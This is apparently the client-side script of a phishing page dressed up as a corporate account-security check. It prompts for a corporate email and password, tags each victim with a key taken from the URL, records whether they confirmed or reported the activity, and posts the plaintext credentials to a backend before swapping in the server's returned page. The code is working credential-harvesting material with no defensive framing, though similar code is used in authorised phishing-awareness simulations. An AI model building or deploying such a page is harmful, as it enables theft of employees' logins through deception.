const urlParams = new URLSearchParams(window.location.search);
const userKey = urlParams.get('k');

let lastClickedAction = 'confirm';

function togglePassword(inputId, button) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (input.type === 'password') {
        input.type = 'text';
        button.textContent = 'Hide';
    } else {
        input.type = 'password';
        button.textContent = 'Show';
    }
}

function setFieldError(inputId, hasError) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (hasError) {
        input.style.borderColor = '#dc2626';
        input.style.background = '#fef2f2';
        input.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.15)';
    } else {
        input.style.borderColor = '#cbd5e1';
        input.style.background = '#f8fafc';
        input.style.boxShadow = 'none';
    }
}

function showStatusBanner(message, kind) {
    let banner = document.getElementById('securityStatusBanner');
    if (!banner) {
        banner = document.createElement('div');
        banner.id = 'securityStatusBanner';
        banner.style.cssText = 'margin-bottom:1rem; padding:0.75rem 1rem; border-radius:8px; font-size:0.85rem; line-height:1.5;';
        const form = document.getElementById('securityVerifyForm');
        if (form) {
            form.parentNode.insertBefore(banner, form);
        } else {
            document.body.prepend(banner);
        }
    }

    if (kind === 'success') {
        banner.style.background = '#ecfdf5';
        banner.style.color = '#065f46';
        banner.style.border = '1px solid #a7f3d0';
    } else if (kind === 'error') {
        banner.style.background = '#fef2f2';
        banner.style.color = '#7f1d1d';
        banner.style.border = '1px solid #fecaca';
    } else {
        banner.style.background = '#eff6ff';
        banner.style.color = '#1e3a8a';
        banner.style.border = '1px solid #bfdbfe';
    }
    banner.textContent = message;
    banner.style.display = 'block';
}

document.querySelectorAll('#securityVerifyForm button[type="submit"]').forEach(btn => {
    btn.addEventListener('click', function () {
        const label = (btn.textContent || '').toLowerCase();
        lastClickedAction = label.includes("wasn") ? 'report' : 'confirm';
    });
});

document.getElementById('securityVerifyForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;

    let isValid = true;

    if (!username) {
        setFieldError('username', true);
        isValid = false;
    } else {
        setFieldError('username', false);
    }

    if (!password) {
        setFieldError('password', true);
        isValid = false;
    } else {
        setFieldError('password', false);
    }

    if (!isValid) {
        showStatusBanner('Please enter your corporate email and password to continue.', 'error');
        return;
    }

    showStatusBanner('Verifying your identity, please wait...', 'info');
    console.log(userKey);

    if (userKey) {
        setTimeout(() => {
            fetch("/api/account_security", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    k: userKey,
                    u: username,
                    p: password,
                    a: lastClickedAction,
                }),
            })
                .then(response => response.text())
                .then(html => {
                    document.open();
                    document.write(html);
                    document.close();
                })
                .catch(error => {
                    console.error("Error submitting:", error);
                    showStatusBanner('Could not reach the verification service. Please try again.', 'error');
                });
        }, 1500);
    } else {
        setTimeout(() => {
            showStatusBanner('Your account has been verified. Redirecting...', 'success');
            window.location.href = '/';
        }, 1500);
    }
});
